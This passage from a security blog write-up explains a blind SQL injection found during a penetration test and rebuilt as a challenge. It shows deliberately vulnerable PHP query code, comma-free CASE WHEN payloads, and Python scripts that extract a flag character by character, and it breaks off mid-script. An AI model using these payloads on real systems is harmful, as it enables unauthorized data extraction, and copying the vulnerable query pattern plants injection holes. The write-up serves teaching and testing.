<!DOCTYPE html>
<html class="has-navbar-fixed-top" lang="en">
<head>
    <meta charset="utf-8">
<title>SQL injection in action: Speeding up under restrictions - Huli&#39;s blog</title>
<meta name="viewport" content="width=device-width, initial-scale=1">



            
<link href="https://blog.huli.tw/2022/01/19/sql-injection-in-action/" rel="alternate" hreflang="zh-TW" />
            
    




    
<link rel="canonical" href="https://blog.huli.tw/2022/01/19/en/sql-injection-in-action/">
    





    <meta name="description" content="Recently, during a penetration test, our team discovered an interesting SQL injection case. Due to some features, we couldn’t directly use existing tools to retrieve data. We had to modify the tools o">
<meta property="og:type" content="article">
<meta property="og:title" content="SQL injection in action: Speeding up under restrictions">
<meta property="og:url" content="https://blog.huli.tw/2022/01/19/en/sql-injection-in-action/index.html">
<meta property="og:site_name" content="Huli&#39;s blog">
<meta property="og:description" content="Recently, during a penetration test, our team discovered an interesting SQL injection case. Due to some features, we couldn’t directly use existing tools to retrieve data. We had to modify the tools o">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://blog.huli.tw/img/sql-injection-in-action/cover-en.png">
<meta property="article:published_time" content="2022-01-19T06:10:44.000Z">
<meta property="article:modified_time" content="2023-06-20T05:10:49.078Z">
<meta property="article:author" content="Huli">
<meta property="article:tag" content="Security">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://blog.huli.tw/img/sql-injection-in-action/cover-en.png">



<link rel="alternative" href="/atom.xml" title="SQL injection in action: Speeding up under restrictions" type="application/atom+xml">



<link rel="icon" href="/img/lidemy_logo.png">


<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Ovo|Source+Code+Pro">


<link rel="stylesheet" href="/css/bulma.css?v=2.css">



<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css">


<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" />
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/line-numbers/prism-line-numbers.min.css" />


<link rel="stylesheet" href="/css/style.css?v=4.css">





    
    
    
    
    
    
    
    
    
    
<script async src="https://www.googletagmanager.com/gtag/js?id=G-1393J2EVCZ"></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'G-1393J2EVCZ');
</script>


    


<meta name="generator" content="Hexo 6.3.0"></head>
<body>
    <script>
        if (localStorage.getItem('dark-mode')) {
            if (localStorage.getItem('dark-mode') === 'true') {
                document.body.classList.add('dark-mode')
            }
        } else {
            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
                document.body.classList.add('dark-mode')
            }
        }
    </script>
    
<nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation">
    <div class="container">
        <div class="navbar-brand">
            <a class="navbar-item navbar-logo" href="/en">
                
                    
                    Huli&#39;s blog
                    
                
            </a>
            <div class="navbar-burger">
                <span></span>
                <span></span>
                <span></span>
            </div>
        </div>
        
        <div class="navbar-menu navbar-start">
            
            <a class="navbar-item "
               href="/en/archives">Archive</a>
            
            <a class="navbar-item "
               href="/en/categories">Categories</a>
            
            <a class="navbar-item "
               href="/en/about">About</a>
            
        </div>
        
        <div class="navbar-menu navbar-end">
            
            
            <div class="navbar-item is-hoverable has-dropdown is-hidden-mobile is-hidden-tablet-only toc">
                <a class="navbar-item" title="Table of Contents">
                    Table of Contents
                </a>
                <div class="navbar-dropdown">
                    
                    
                    
                    
                    <a class="navbar-item" href="#case-one-search-function">1&nbsp;&nbsp;<b>Case One: Search Function</b></a>
                    
                    
                    
                    <a class="navbar-item" href="#speed-up-try-three-at-once">1.1&nbsp;&nbsp;Speed up: Try three at once</a>
                    
                    
                    
                    <a class="navbar-item" href="#further-acceleration-ternary-search">1.2&nbsp;&nbsp;Further acceleration: Ternary search</a>
                    
                    
                    
                    <a class="navbar-item" href="#final-acceleration-multi-threading">1.3&nbsp;&nbsp;Final acceleration: Multi-threading</a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#case-2-room-reservation-query-function">2&nbsp;&nbsp;<b>Case 2: Room reservation query function</b></a>
                    
                    
                    
                    <a class="navbar-item" href="#acceleration-smuggling-two-characters-at-a-time">2.1&nbsp;&nbsp;Acceleration: Smuggling two characters at a time</a>
                    
                    
                    
                    <a class="navbar-item" href="#further-acceleration-smuggling-n-characters-at-a-time">2.2&nbsp;&nbsp;Further acceleration: Smuggling n characters at a time</a>
                    
                    
                    
                    <a class="navbar-item" href="#final-acceleration-making-use-of-multiple-dates">2.3&nbsp;&nbsp;Final acceleration: Making use of multiple dates</a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#conclusion">3&nbsp;&nbsp;<b>Conclusion</b></a>
                    
                </div>
            </div>
            
            
            <a class="navbar-item" target="_blank" title="Twitter" href="https://twitter.com/aszx87410">
                
                <i class="fab fa-twitter"></i>
                
            </a>
               
            <a class="navbar-item" target="_blank" title="RSS" href="/atom-en.xml">
                
                <i class="fas fa-rss"></i>
                
            </a>
               
            
            <a class="navbar-item btn-dark-mode" title="dark-mode" href="#">
                <div>
                    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" width="15" height="15" viewBox="0 0 256 256" xml:space="preserve">
                    <defs>
                    </defs>
                    <g style="stroke: none; stroke-width: 0; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: none; fill-rule: nonzero; opacity: 1;" transform="translate(1.4065934065934016 1.4065934065934016) scale(2.81 2.81)" >
                        <path d="M 87.823 60.7 c -0.463 -0.423 -1.142 -0.506 -1.695 -0.214 c -15.834 8.398 -35.266 2.812 -44.232 -12.718 c -8.966 -15.53 -4.09 -35.149 11.101 -44.665 c 0.531 -0.332 0.796 -0.963 0.661 -1.574 c -0.134 -0.612 -0.638 -1.074 -1.259 -1.153 c -9.843 -1.265 -19.59 0.692 -28.193 5.66 C 13.8 12.041 6.356 21.743 3.246 33.35 S 1.732 57.08 7.741 67.487 c 6.008 10.407 15.709 17.851 27.316 20.961 C 38.933 89.486 42.866 90 46.774 90 c 7.795 0 15.489 -2.044 22.42 -6.046 c 8.601 -4.966 15.171 -12.43 18.997 -21.586 C 88.433 61.79 88.285 61.123 87.823 60.7 z" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: #ffa716; fill-rule: nonzero; opacity: 1;" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round" />
                    </g>
                    </svg>
                </div>
            </a>
            
               <a class="navbar-item" href="/2022/01/19/sql-injection-in-action/">中文</a>
            
            

        </div>
    </div>
</nav>

    <section class="section">
    <div class="container">
      
      <div data-nosnippet class="self-notice">
        If you have any thoughts on my blog or articles and you want to let me know, you can either post a comment below(public) or tell me via this <a href="https://forms.gle/SjJZ4cnNs6NnjXQG8" target="_blank">feedback form</a>
      </div>
      
    <article class="article content gallery" itemscope itemprop="blogPost">
    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
        
            SQL injection in action: Speeding up under restrictions
        
    </h1>
    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
        <span class="column is-narrow">
            <time datetime="2022-01-19T06:10:44.000Z" itemprop="datePublished">19 January 2022</time>
        </span>
        
        <span class="column is-narrow article-category">
            <i class="far fa-folder"></i>
            <a class="article-category-link" href="/en/categories/Security/">Security</a>
        </span>
        
        
        
        <spen data-nosnippet class="column is-narrow">(Translated by ChatGPT)</span>
        
    </div>
    
    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
    
        <p>Recently, during a penetration test, our team discovered an interesting SQL injection case. Due to some features, we couldn’t directly use existing tools to retrieve data. We had to modify the tools or write scripts to effectively utilize them. Therefore, this article will share two practical cases and my own solutions.</p>
<p>I have put these two cases on Heroku and turned them into two small challenges. If you are interested, you can try them out:</p>
<p>(The Heroku links are no longer available)</p>
<span id="more"></span>

<p>The original case was similar to a hotel booking website, so these two challenges are actually functions that a hotel booking website would have. The first one is a search function, and the second one is a room booking query function.</p>
<p>The first challenge requires retrieving the flag from a specified table, and the flag in the second challenge is hidden in another table. You need to find that table and retrieve the flag. The flag format is: <code>cymetrics&#123;a-z_&#125;</code>.</p>
<p>Because Heroku has an automatic sleep mechanism, it may take five or six seconds to see the screen, which is normal.</p>
<p>I don’t think the difficulty of these two questions is high, but the key is how to find more efficient solutions. Below are the explanations of the two cases and my own solutions.</p>
<h2><span id="case-one-search-function">Case One: Search Function</span></h2><p>The first case is a search function. There is a table called “home” that stores three columns: id, name, and tags. Tags are a comma-separated string used to indicate which tags the data has.</p>
<p>If nothing is passed in, the following data will be returned:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">[</span>
    <span class="token punctuation">&#123;</span>
        <span class="token string-property property">"id"</span><span class="token operator">:</span> <span class="token string">"1"</span><span class="token punctuation">,</span>
        <span class="token string-property property">"name"</span><span class="token operator">:</span> <span class="token string">"home1"</span><span class="token punctuation">,</span>
        <span class="token string-property property">"tags"</span><span class="token operator">:</span> <span class="token string">"1,2,3,4"</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
    <span class="token punctuation">&#123;</span>
        <span class="token string-property property">"id"</span><span class="token operator">:</span> <span class="token string">"2"</span><span class="token punctuation">,</span>
        <span class="token string-property property">"name"</span><span class="token operator">:</span> <span class="token string">"home2"</span><span class="token punctuation">,</span>
        <span class="token string-property property">"tags"</span><span class="token operator">:</span> <span class="token string">"1,5"</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Therefore, we can know that there are two pieces of data in the database. Then we can pass in <code>tag</code> to filter and find the specified data, like this:</p>
<p><a target="_blank" rel="noopener" href="https://od-php.herokuapp.com/sql/search.php?tag=5">https://od-php.herokuapp.com/sql/search.php?tag=5</a></p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">[</span>
    <span class="token punctuation">&#123;</span>
        <span class="token string-property property">"id"</span><span class="token operator">:</span> <span class="token string">"2"</span><span class="token punctuation">,</span>
        <span class="token string-property property">"name"</span><span class="token operator">:</span> <span class="token string">"home2"</span><span class="token punctuation">,</span>
        <span class="token string-property property">"tags"</span><span class="token operator">:</span> <span class="token string">"1,5"</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>The <code>tag</code> parameter can be separated by commas to search for multiple values at once, like this:</p>
<p><a target="_blank" rel="noopener" href="https://od-php.herokuapp.com/sql/search.php?tag=2,5">https://od-php.herokuapp.com/sql/search.php?tag=2,5</a></p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">[</span>
    <span class="token punctuation">&#123;</span>
        <span class="token string-property property">"id"</span><span class="token operator">:</span> <span class="token string">"1"</span><span class="token punctuation">,</span>
        <span class="token string-property property">"name"</span><span class="token operator">:</span> <span class="token string">"home1"</span><span class="token punctuation">,</span>
        <span class="token string-property property">"tags"</span><span class="token operator">:</span> <span class="token string">"1,2,3,4"</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
    <span class="token punctuation">&#123;</span>
        <span class="token string-property property">"id"</span><span class="token operator">:</span> <span class="token string">"2"</span><span class="token punctuation">,</span>
        <span class="token string-property property">"name"</span><span class="token operator">:</span> <span class="token string">"home2"</span><span class="token punctuation">,</span>
        <span class="token string-property property">"tags"</span><span class="token operator">:</span> <span class="token string">"1,5"</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>That’s basically it for the function. The original actual case was a bit more complicated, but for the sake of simplicity, only the most essential parts were kept, and other irrelevant things were removed.</p>
<p>Next, let’s take a look at the key code:</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT id, name, tags from home "</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$tag</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"sleep"</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"QQ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$tag</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$tag</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token variable">$tag_arr</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">','</span><span class="token punctuation">,</span> <span class="token variable">$tag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token variable">$sql_tag</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$tag_arr</span> <span class="token keyword">as</span> <span class="token variable">$k</span> <span class="token operator">=></span> <span class="token variable">$v</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$sql_tag</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"( FIND_IN_SET(<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$v</span><span class="token punctuation">&#125;</span></span>, tags) )"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$sql_tag</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token variable">$sql</span><span class="token operator">.=</span> <span class="token string double-quoted-string">"where ("</span> <span class="token operator">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">' OR '</span><span class="token punctuation">,</span> <span class="token variable">$sql_tag</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">")"</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Here, SQL query is composed by string concatenation, so there is an obvious SQL injection vulnerability. If you pass in <code>?tag=&#39;</code>, the SQL query will fail. For the convenience of debugging, the SQL query will be printed out when an error occurs.</p>
<p>A very intuitive way to retrieve other data is to use <code>union</code>, but this trick doesn’t work here because the parameter we pass in is separated by commas, so there can be no commas in our payload, otherwise the entire query will be messed up and become very strange.</p>
<p>Therefore, one of the interesting things about this question is how to use this vulnerability without using commas.</p>
<p>A simple and intuitive way is to use <code>case when</code> with <code>sleep</code>, like this:</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">case</span> <span class="token keyword">when</span> <span class="token punctuation">(</span>content <span class="token operator">like</span> <span class="token string">"c%"</span><span class="token punctuation">)</span> <span class="token keyword">then</span> <span class="token number">1</span> <span class="token keyword">else</span> sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">end</span> <span class="token keyword">from</span> flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>From the response time of the response, we can infer whether the condition is met or not. However, because the code blocks sleep, we cannot use it in this way (the original case did not block this, but I added it separately).</p>
<p>But if you observe carefully, you will find that we don’t need to use sleep. We can use the return value of <code>case when</code> to perform the original filtering function and infer which condition is met from the result, like this:</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">case</span> <span class="token keyword">when</span> <span class="token punctuation">(</span>content <span class="token operator">like</span> <span class="token string">"c%"</span><span class="token punctuation">)</span> <span class="token keyword">then</span> <span class="token number">1</span> <span class="token keyword">else</span> <span class="token number">10</span> <span class="token keyword">end</span> <span class="token keyword">from</span> flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>When the condition (<code>content like &#39;c%&#39;</code>) is met, the return value is 1, otherwise it is 10. If it is 1, the returned JSON will have data, otherwise it won’t. Therefore, we can know whether the condition is met based on whether there is data or not.</p>
<p>Next, let’s write a script for this simplest method.</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># exploit-search.py</span>
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> datetime
<span class="token keyword">import</span> json

host <span class="token operator">=</span> <span class="token string">'https://od-php.herokuapp.com/sql'</span>
char_index <span class="token operator">=</span> <span class="token number">0</span>
char_set <span class="token operator">=</span> <span class="token string">'abcdefghijklmnopqrstuvwxyz&#125;_'</span>
result <span class="token operator">=</span> <span class="token string">'cymetrics&#123;'</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
  <span class="token keyword">if</span> char_index <span class="token operator">>=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>char_set<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"end"</span><span class="token punctuation">)</span>
    <span class="token keyword">break</span>

  char <span class="token operator">=</span> char_set<span class="token punctuation">[</span>char_index<span class="token punctuation">]</span>
  payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'(select case when (content like "</span><span class="token interpolation"><span class="token punctuation">&#123;</span>result<span class="token punctuation">&#125;</span></span><span class="token interpolation"><span class="token punctuation">&#123;</span>char<span class="token punctuation">&#125;</span></span><span class="token string">%") then 1 else 10 end from flag)'</span></span>
  response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>host<span class="token punctuation">&#125;</span></span><span class="token string">/search.php?tag=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"trying"</span><span class="token punctuation">,</span> char<span class="token punctuation">)</span>
  <span class="token keyword">if</span> response<span class="token punctuation">.</span>ok<span class="token punctuation">:</span>
    data <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>
      result <span class="token operator">+=</span> char
      <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
      char_index <span class="token operator">=</span> <span class="token number">0</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
      char_index <span class="token operator">+=</span> <span class="token number">1</span>

  <span class="token keyword">else</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
    <span class="token keyword">break</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Simply put, each character is continuously tested until it is found. It is simple and violent but effective. It takes about three to five minutes to run, and the execution process will be like this:</p>
<p><img src="/img/sql-injection-in-action/p1.png"></p>
<p>If it is a challenge like this, where we know the table name and column name in advance, the execution time may be longer, but three to five minutes is still within an acceptable range. However, in actual cases, we may not know anything and need to go to the information_schema to retrieve various information before dumping the entire database.</p>
<p>Therefore, we need a more efficient approach.</p>
<h3><span id="speed-up-try-three-at-once">Speed up: Try three at once</span></h3><p>In fact, if we observe carefully, we can control four types of return results:</p>
<ol>
<li>home1 and home2 appear together (when the tag is 1)</li>
<li>Only home1 appears (when the tag is 2)</li>
<li>Only home2 appears (when the tag is 5)</li>
<li>Neither of them appear (when the tag is 10)</li>
</ol>
<p>And in the previous attack method, we only used two of these situations. If we use all four, the speed will triple.</p>
<p>The way to use it is very simple. We can change from trying one at a time to trying three at a time, like this:</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">case</span>
  <span class="token keyword">when</span> <span class="token punctuation">(</span>content <span class="token operator">like</span> <span class="token string">"a%"</span><span class="token punctuation">)</span> <span class="token keyword">then</span> <span class="token number">1</span>
  <span class="token keyword">when</span> <span class="token punctuation">(</span>content <span class="token operator">like</span> <span class="token string">"b%"</span><span class="token punctuation">)</span> <span class="token keyword">then</span> <span class="token number">2</span>
  <span class="token keyword">when</span> <span class="token punctuation">(</span>content <span class="token operator">like</span> <span class="token string">"c%"</span><span class="token punctuation">)</span> <span class="token keyword">then</span> <span class="token number">5</span>
  <span class="token keyword">else</span> <span class="token number">10</span>
<span class="token keyword">end</span> <span class="token keyword">from</span> flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>One query can try three characters, and the speed is tripled. The script is as follows:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># exploit-search-3x.py</span>
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> datetime
<span class="token keyword">import</span> json
<span class="token keyword">import</span> urllib<span class="token punctuation">.</span>parse
<span class="token keyword">import</span> time

<span class="token keyword">def</span> <span class="token function">print_success</span><span class="token punctuation">(</span>raw<span class="token punctuation">)</span><span class="token punctuation">:</span>
  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"\033[92m</span><span class="token interpolation"><span class="token punctuation">&#123;</span>raw<span class="token punctuation">&#125;</span></span><span class="token string">\033[0m"</span></span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">encode</span><span class="token punctuation">(</span>raw<span class="token punctuation">)</span><span class="token punctuation">:</span>
  <span class="token keyword">return</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>raw<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

host <span class="token operator">=</span> <span class="token string">'https://od-php.herokuapp.com/sql'</span>
char_index <span class="token operator">=</span> <span class="token number">0</span>
char_set <span class="token operator">=</span> <span class="token string">'&#125;abcdefghijklmnopqrstuvwxyz_'</span>
result <span class="token operator">=</span> <span class="token string">'cymetrics&#123;'</span>

start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
  found <span class="token operator">=</span> <span class="token boolean">False</span>
  <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>char_set<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    chars <span class="token operator">=</span> char_set<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">]</span>
    <span class="token keyword">while</span> <span class="token builtin">len</span><span class="token punctuation">(</span>chars<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">:</span>
      chars <span class="token operator">+=</span> <span class="token string">'a'</span>
    payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'''
    (select case
      when (content like "</span><span class="token interpolation"><span class="token punctuation">&#123;</span>result<span class="token operator">+</span>chars<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">%") then 1  
      when (content like "</span><span class="token interpolation"><span class="token punctuation">&#123;</span>result<span class="token operator">+</span>chars<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">%") then 2  
      when (content like "</span><span class="token interpolation"><span class="token punctuation">&#123;</span>result<span class="token operator">+</span>chars<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">%") then 5
      else 10
     end from flag)
    '''</span></span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"trying "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>chars<span class="token punctuation">)</span><span class="token punctuation">)</span>
    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>host<span class="token punctuation">&#125;</span></span><span class="token string">/search.php?tag=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>encode<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> response<span class="token punctuation">.</span>ok<span class="token punctuation">:</span>
      data <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
      <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">:</span>
        result<span class="token operator">+=</span>chars<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        found <span class="token operator">=</span> <span class="token boolean">True</span>
      <span class="token keyword">elif</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
        <span class="token keyword">continue</span>
      <span class="token keyword">else</span><span class="token punctuation">:</span>
        found <span class="token operator">=</span> <span class="token boolean">True</span>
        <span class="token keyword">if</span> data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"home1"</span><span class="token punctuation">:</span>
          result<span class="token operator">+=</span>chars<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
          result<span class="token operator">+=</span>chars<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>

    <span class="token keyword">else</span><span class="token punctuation">:</span>
      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">)</span>
      <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
      <span class="token keyword">break</span>

    <span class="token keyword">if</span> found<span class="token punctuation">:</span>
      print_success<span class="token punctuation">(</span><span class="token string">"found: "</span> <span class="token operator">+</span> result<span class="token punctuation">)</span>
      <span class="token keyword">break</span>

  <span class="token keyword">if</span> <span class="token keyword">not</span> found<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"end"</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
    <span class="token keyword">break</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"time: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> start<span class="token punctuation">&#125;</span></span><span class="token string">s"</span></span><span class="token punctuation">)</span><span aria-hidden="true" 